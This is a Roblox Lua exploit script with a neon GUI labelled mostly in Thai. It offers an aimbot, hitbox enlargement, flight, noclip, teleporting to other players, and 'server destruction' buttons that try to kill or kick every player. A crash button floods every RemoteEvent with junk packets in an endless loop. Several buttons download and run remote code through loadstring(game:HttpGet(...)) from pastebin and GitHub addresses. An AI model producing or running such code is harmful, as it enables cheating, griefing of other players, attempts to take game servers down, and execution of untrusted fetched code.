-- [[ ALIEN TOWN SHOP v2 - ULTRA PREMIUM CYBERHUB ]] --
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- Setup GUI Core
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AlienTownShop_V2"
ScreenGui.Parent = game.CoreGui
ScreenGui.ResetOnSpawn = false

-- ==========================================
-- 🎨 DESIGN & UI STRUCTURE (PREMIUM NEON)
-- ==========================================

-- หน้าจอหลัก
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 18, 15)
MainFrame.BorderColor3 = Color3.fromRGB(0, 255, 130)
MainFrame.BorderSizePixel = 1
MainFrame.Position = UDim2.new(0.25, 0, 0.2, 0)
MainFrame.Size = UDim2.new(0, 560, 0, 420)
MainFrame.Active = true
MainFrame.Draggable = true

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 10)
MainCorner.Parent = MainFrame

-- แถบหัวข้อ (Title Bar)
local TitleBar = Instance.new("Frame")
TitleBar.Name = "TitleBar"
TitleBar.Parent = MainFrame
TitleBar.BackgroundColor3 = Color3.fromRGB(22, 28, 22)
TitleBar.Size = UDim2.new(1, 0, 0, 45)

local TitleCorner = Instance.new("UICorner")
TitleCorner.CornerRadius = UDim.new(0, 10)
TitleCorner.Parent = TitleBar

local Title = Instance.new("TextLabel")
Title.Parent = TitleBar
Title.Size = UDim2.new(0.8, 0, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.Font = Enum.Font.GothamBold
Title.Text = "👽 ALIEN TOWN SHOP - V2 PREMIUM"
Title.TextColor3 = Color3.fromRGB(0, 255, 130)
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left

-- ปุ่มปิดถาวร (Close Button)
local CloseBtn = Instance.new("TextButton")
CloseBtn.Parent = TitleBar
CloseBtn.Size = UDim2.new(0, 30, 0, 30)
CloseBtn.Position = UDim2.new(1, -40, 0, 7)
CloseBtn.BackgroundColor3 = Color3.fromRGB(50, 15, 15)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.Text = "X"
CloseBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
CloseBtn.TextSize = 14
local CloseCorner = Instance.new("UICorner")
CloseCorner.CornerRadius = UDim.new(0, 6)
CloseCorner.Parent = CloseBtn
CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

-- ปุ่มย่อหน้าต่างลอยหน้าจอ (Minimize Toggle Button)
local MiniBtn = Instance.new("TextButton")
MiniBtn.Parent = ScreenGui
MiniBtn.Size = UDim2.new(0, 55, 0, 55)
MiniBtn.Position = UDim2.new(0, 20, 0, 20)
MiniBtn.BackgroundColor3 = Color3.fromRGB(15, 30, 15)
MiniBtn.BorderColor3 = Color3.fromRGB(0, 255, 130)
MiniBtn.BorderSizePixel = 2
MiniBtn.Font = Enum.Font.GothamBold
MiniBtn.Text = "👽"
MiniBtn.TextColor3 = Color3.fromRGB(0, 255, 130)
MiniBtn.TextSize = 25
MiniBtn.Visible = false
local MiniCorner = Instance.new("UICorner")
MiniCorner.CornerRadius = UDim.new(0, 50)
MiniCorner.Parent = MiniBtn

-- ปุ่มกดย่อเมนูใน TitleBar
local HideBtn = Instance.new("TextButton")
HideBtn.Parent = TitleBar
HideBtn.Size = UDim2.new(0, 30, 0, 30)
HideBtn.Position = UDim2.new(1, -75, 0, 7)
HideBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 20)
HideBtn.Font = Enum.Font.GothamBold
HideBtn.Text = "-"
HideBtn.TextColor3 = Color3.fromRGB(0, 255, 130)
HideBtn.TextSize = 16
local HideCorner = Instance.new("UICorner")
HideCorner.CornerRadius = UDim.new(0, 6)
HideCorner.Parent = HideBtn

HideBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = false
    MiniBtn.Visible = true
end)
MiniBtn.MouseButton1Click:Connect(function()
    MainFrame.Visible = true
    MiniBtn.Visible = false
end)

-- แถบนำทางด้านซ้าย (Tabs Menu)
local TabContainer = Instance.new("Frame")
TabContainer.Parent = MainFrame
TabContainer.BackgroundColor3 = Color3.fromRGB(18, 22, 18)
TabContainer.Position = UDim2.new(0, 8, 0, 55)
TabContainer.Size = UDim2.new(0, 135, 1, -65)
local TabContainerCorner = Instance.new("UICorner")
TabContainerCorner.CornerRadius = UDim.new(0, 8)
TabContainerCorner.Parent = TabContainer

local TabLayout = Instance.new("UIListLayout")
TabLayout.Parent = TabContainer
TabLayout.Padding = UDim.new(0, 5)

-- พื้นที่แสดงข้อมูลขวา
local ContentContainer = Instance.new("Frame")
ContentContainer.Parent = MainFrame
ContentContainer.BackgroundColor3 = Color3.fromRGB(10, 12, 10)
ContentContainer.Position = UDim2.new(0, 150, 0, 55)
ContentContainer.Size = UDim2.new(1, -158, 1, -65)
local ContentCorner = Instance.new("UICorner")
ContentCorner.CornerRadius = UDim.new(0, 8)
ContentCorner.Parent = ContentContainer

local Config = { WalkSpeed = 16, JumpPower = 50, HitboxSize = 2, AimbotActive = false }
local Pages = {}

-- ==========================================
-- 🛠️ UI GENERATOR FUNCTIONS 🛠️
-- ==========================================

local function CreateTab(tabName)
    local TabButton = Instance.new("TextButton")
    TabButton.Size = UDim2.new(1, 0, 0, 35)
    TabButton.BackgroundColor3 = Color3.fromRGB(25, 35, 25)
    TabButton.Font = Enum.Font.GothamBold
    TabButton.Text = tabName
    TabButton.TextColor3 = Color3.fromRGB(160, 255, 160)
    TabButton.TextSize = 13
    TabButton.Parent = TabContainer
    local BCOR = Instance.new("UICorner")
    BCOR.CornerRadius = UDim.new(0, 6)
    BCOR.Parent = TabButton

    local Page = Instance.new("ScrollingFrame")
    Page.Size = UDim2.new(1, -10, 1, -10)
    Page.Position = UDim2.new(0, 5, 0, 5)
    Page.BackgroundTransparency = 1
    Page.Visible = false
    Page.CanvasSize = UDim2.new(0, 0, 0, 650)
    Page.ScrollBarThickness = 4
    Page.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 130)
    Page.Parent = ContentContainer

    local PageLayout = Instance.new("UIListLayout")
    PageLayout.Parent = Page
    PageLayout.Padding = UDim.new(0, 6)

    TabButton.MouseButton1Click:Connect(function()
        for _, p in pairs(Pages) do p.Visible = false end
        Page.Visible = true
    end)

    table.insert(Pages, Page)
    if #Pages == 1 then Page.Visible = true end
    return Page
end

local function AddToggle(parent, text, default, callback)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, 0, 0, 38)
    Frame.BackgroundColor3 = Color3.fromRGB(20, 25, 20)
    Frame.Parent = parent
    local FC = Instance.new("UICorner")
    FC.CornerRadius = UDim.new(0, 6)
    FC.Parent = Frame

    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(0.7, 0, 1, 0)
    Label.Position = UDim2.new(0, 10, 0, 0)
    Label.Text = text
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 14
    Label.TextColor3 = Color3.fromRGB(220, 255, 220)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.BackgroundTransparency = 1
    Label.Parent = Frame

    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(0, 65, 0, 26)
    Button.Position = UDim2.new(1, -75, 0, 6)
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 12
    Button.Parent = Frame
    local BC = Instance.new("UICorner")
    BC.CornerRadius = UDim.new(0, 6)
    BC.Parent = Button

    local state = default
    local function update()
        Button.Text = state and "ON" or "OFF"
        Button.BackgroundColor3 = state and Color3.fromRGB(0, 200, 90) or Color3.fromRGB(50, 20, 20)
        Button.TextColor3 = state and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(240, 120, 120)
        callback(state)
    end
    Button.MouseButton1Click:Connect(function() state = not state; update() end)
    update()
end

local function AddTextBox(parent, text, default, callback)
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(1, 0, 0, 38)
    Frame.BackgroundColor3 = Color3.fromRGB(20, 25, 20)
    Frame.Parent = parent
    local FC = Instance.new("UICorner")
    FC.CornerRadius = UDim.new(0, 6)
    FC.Parent = Frame

    local Label = Instance.new("TextLabel")
    Label.Size = UDim2.new(0.65, 0, 1, 0)
    Label.Position = UDim2.new(0, 10, 0, 0)
    Label.Text = text
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 14
    Label.TextColor3 = Color3.fromRGB(220, 255, 220)
    Label.TextXAlignment = Enum.TextXAlignment.Left
    Label.BackgroundTransparency = 1
    Label.Parent = Frame

    local Box = Instance.new("TextBox")
    Box.Size = UDim2.new(0, 85, 0, 26)
    Box.Position = UDim2.new(1, -95, 0, 6)
    Box.BackgroundColor3 = Color3.fromRGB(15, 18, 15)
    Box.BorderColor3 = Color3.fromRGB(0, 255, 130)
    Box.Font = Enum.Font.Code
    Box.Text = tostring(default)
    Box.TextColor3 = Color3.fromRGB(0, 255, 130)
    Box.TextSize = 12
    Box.Parent = Frame
    local BC = Instance.new("UICorner")
    BC.CornerRadius = UDim.new(0, 6)
    BC.Parent = Box

    Box.FocusLost:Connect(function() callback(Box.Text) end)
end

local function AddButton(parent, text, callback)
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(1, 0, 0, 35)
    Button.BackgroundColor3 = Color3.fromRGB(30, 45, 30)
    Button.Font = Enum.Font.GothamBold
    Button.Text = text
    Button.TextColor3 = Color3.fromRGB(0, 255, 130)
    Button.TextSize = 14
    Button.Parent = parent
    local BC = Instance.new("UICorner")
    BC.CornerRadius = UDim.new(0, 6)
    BC.Parent = Button
    Button.MouseButton1Click:Connect(callback)
end

-- ==========================================
-- 🗂️ CREATING MODULES & CODES 🗂️
-- ==========================================

local TabPvP = CreateTab("🎯 เปิดตัว/PVP")
local TabMove = CreateTab("🏃 ควบคุมการเคลื่อนที่")
local TabTeleport = CreateTab("🗺️ เทเลพอร์ต / วาร์ป")
local TabServer = CreateTab("💥 ป่วนเซิร์ฟ (เสี่ยงสูง)")
local TabUtility = CreateTab("🛠️ เครื่องมือเสริม")

--------------------------------------------------
-- 🎯 PVP & AIMBOT
--------------------------------------------------
AddToggle(TabPvP, "เปิดใช้งาน Aimbot (ล็อกหัว)", false, function(state)
    Config.AimbotActive = state
    if state then
        spawn(function()
            while Config.AimbotActive do
                local target = nil
                local closest = math.huge
                for _, v in pairs(Players:GetPlayers()) do
                    if v ~= LP and v.Character and v.Character:FindFirstChild("Head") then
                        local dist = (v.Character.Head.Position - LP.Character.Head.Position).Magnitude
                        if dist < closest then closest = dist; target = v end
                    end
                end
                if target then Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Character.Head.Position) end
                task.wait()
            end
        end)
    end
end)

AddTextBox(TabPvP, "ปรับขนาด Hitbox (ระบุตัวเลข)", 2, function(val)
    Config.HitboxSize = tonumber(val) or 2
end)

AddToggle(TabPvP, "เปิดใช้งานขยาย Hitbox", false, function(state)
    if state then
        for _, v in pairs(game:GetService("Players"):GetPlayers()) do
            if v ~= LP and v.Character and v.Character:FindFirstChild("Head") then
                v.Character.Head.Size = Vector3.new(Config.HitboxSize, Config.HitboxSize, Config.HitboxSize)
                v.Character.Head.Transparency = 0.5
                v.Character.Head.CanCollide = false
            end
        end
    end
end)

--------------------------------------------------
-- 🏃 ADVANCED MOVEMENT & FIX FLY
--------------------------------------------------
AddTextBox(TabMove, "ตั้งความเร็วเดิน (WalkSpeed)", 16, function(val)
    local num = tonumber(val)
    if num then LP.Character.Humanoid.WalkSpeed = num end
end)

local flyActive = false
local flySpeed = 50
AddTextBox(TabMove, "ความเร็วตอนบิน (Fly Speed)", 50, function(val)
    flySpeed = tonumber(val) or 50
end)

AddToggle(TabMove, "เปิดโหมดบินควบคุมอิสระ", false, function(state)
    flyActive = state
    if state then
        local root = LP.Character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        
        local bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bv.Velocity = Vector3.new(0, 0, 0)
        bv.Parent = root
        
        spawn(function()
            while flyActive and root and root.Parent do
                local dir = Vector3.new(0,0,0)
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir = dir + Camera.CFrame.LookVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir = dir - Camera.CFrame.LookVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir = dir + Camera.CFrame.RightVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir = dir - Camera.CFrame.RightVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir = dir + Vector3.new(0, 1, 0) end
                if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then dir = dir - Vector3.new(0, 1, 0) end
                
                bv.Velocity = dir.Unit * flySpeed
                if dir == Vector3.new(0,0,0) then bv.Velocity = Vector3.new(0,0,0) end
                task.wait()
            end
            bv:Destroy()
        end)
    end
end)

AddToggle(TabMove, "เดินทะลุกำแพง (Noclip)", false, function(state)
    local noclipConn
    if state then
        noclipConn = RunService.Stepped:Connect(function()
            if not state then noclipConn:Disconnect() end
            if LP.Character then
                for _, v in pairs(LP.Character:GetChildren()) do
                    if v:IsA("BasePart") then v.CanCollide = false end
                end
            end
        end)
    else
        if noclipConn then noclipConn:Disconnect() end
    end
end)

--------------------------------------------------
-- 🗺️ TELEPORT TARGET SYSTEM
--------------------------------------------------
local targetPlayerName = ""
AddTextBox(TabTeleport, "พิมพ์ชื่อผู้เล่นที่จะวาร์ปไปหา", "ชื่อผู้เล่น", function(text)
    targetPlayerName = text
end)

AddButton(TabTeleport, "📍 วาร์ปไปหาผู้เล่นที่เลือก", function()
    for _, v in pairs(Players:GetPlayers()) do
        if string.sub(string.lower(v.Name), 1, string.len(targetPlayerName)) == string.lower(targetPlayerName) or string.sub(string.lower(v.DisplayName), 1, string.len(targetPlayerName)) == string.lower(targetPlayerName) then
            if v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
                LP.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                break
            end
        end
    end
end)

AddButton(TabTeleport, "🎲 สุ่มวาร์ปไปหาใครก็ได้", function()
    local all = Players:GetPlayers()
    local rand = all[math.random(1, #all)]
    if rand and rand ~= LP and rand.Character then
        LP.Character.HumanoidRootPart.CFrame = rand.Character.HumanoidRootPart.CFrame
    end
end)

--------------------------------------------------
-- 💥 SERVER DESTRUCTION (BYPASS ATTEMPTS)
--------------------------------------------------
AddButton(TabServer, "💀 Kill All (พยายามสังหารหมู่)", function()
    local tool = LP.Character:FindFirstChildOfClass("Tool") or LP.Backpack:FindFirstChildOfClass("Tool")
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LP and v.Character and v.Character:FindFirstChild("Humanoid") then
            pcall(function()
                if tool and tool:FindFirstChild("RemoteEvent") then
                    tool.RemoteEvent:FireServer(v.Character.Humanoid, 100)
                else
                    v.Character.Humanoid.Health = 0
                end
            end)
        end
    end
end)

AddButton(TabServer, "🚫 Kick All (ดีดทุกคนออก - พยายามใช้ Remote บั๊ก)", function()
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LP then 
            pcall(function() 
                v:Kick("Kicked via ALIEN TOWN SHOP exploit framework.") 
            end) 
        end
    end
end)

AddButton(TabServer, "❌ ยิงเซิร์ฟเวอร์ค้าง (Crash Attempt)", function()
    while task.wait(0.05) do
        pcall(function()
            for _, r in pairs(game:GetDescendants()) do
                if r:IsA("RemoteEvent") then
                    r:FireServer(string.rep("ALIEN_TOWN_ATTACK_PACKET_9999", 500))
                end
            end
        end)
    end
end)

--------------------------------------------------
-- 🛠️ UTILITIES & NEW FEATURES (DARK DEX / IY / SIMULATION TOOLS)
--------------------------------------------------
AddButton(TabUtility, "🛠️ โหลดปืนสร้างบล็อก F3X", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/d6M7v9Mc"))()
end)

AddButton(TabUtility, "💡 เปิดไฟทั่วแมพ (Full Bright)", function()
    game:GetService("Lighting").Brightness = 4
    game:GetService("Lighting").GlobalShadows = false
    game:GetService("Lighting").ClockTime = 14
end)

-- เพิ่มปุ่มเปิดสคริปต์ Dark Dex Explorer
AddButton(TabUtility, "🗂️ เปิดใช้งาน Dark Dex Explorer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/infyydn/vba/main/dex.lua"))()
end)

-- เพิ่มปุ่มเปิดสคริปต์ Infinite Yield
AddButton(TabUtility, "🏃 เปิดใช้งาน Infinite Yield (IY)", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

-- ระบบสร้างปืนช็อตไฟฟ้าจำลอง (Stun Taser Simulator)
AddButton(TabUtility, "⚡ เสกปืนช็อตไฟฟ้า (Taser Tool)", function()
    local taser = Instance.new("Tool")
    taser.Name = "⚡ ALIEN TASER"
    taser.RequiresHandle = true
    
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(1, 1, 2)
    handle.BrickColor = BrickColor.new("Neon greenish orange")
    handle.Parent = taser
    
    taser.Activated:Connect(function()
        local mouse = LP:GetMouse()
        local target = mouse.Target
        if target and target.Parent and target.Parent:FindFirstChildOfClass("Humanoid") then
            local enemyHumanoid = target.Parent:FindFirstChildOfClass("Humanoid")
            local enemyRoot = target.Parent:FindFirstChild("HumanoidRootPart")
            
            -- จำลองเอฟเฟกต์สตั๊น 3-5 วินาทีฝั่งผู้ใช้
            pcall(function()
                enemyHumanoid.WalkSpeed = 0
                if enemyRoot then
                    enemyRoot.CFrame = enemyRoot.CFrame * CFrame.Angles(math.rad(90), 0, 0) -- สั่งให้โมเดลหมอบราบลงไป
                end
                task.wait(math.random(3, 5))
                enemyHumanoid.WalkSpeed = 16
            end)
        end
    end)
    taser.Parent = LP.Backpack
end)

-- ระบบสแกนหาอาวุธในโฟลเดอร์สาธารณะและคัดลอกมาใช้งาน (Weapon Requester Simulator)
AddButton(TabUtility, "⚔️ สแกนและเสกอาวุธในแมพ (Get Map Tools)", function()
    local foundCount = 0
    -- สแกนหาวัตถุประเภท Tool ที่ระบบเกมเปิดแชร์ไว้ใน ReplicatedStorage
    for _, item in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if item:IsA("Tool") then
            local clone = item:Clone()
            clone.Parent = LP.Backpack
            foundCount = foundCount + 1
        end
    end
    
    -- ค้นหาเพิ่มเติมในช่อง Workspace
    for _, item in pairs(workspace:GetDescendants()) do
        if item:IsA("Tool") and not item:IsDescendantOf(game.Players) then
            local clone = item:Clone()
            clone.Parent = LP.Backpack
            foundCount = foundCount + 1
        end
    end
end)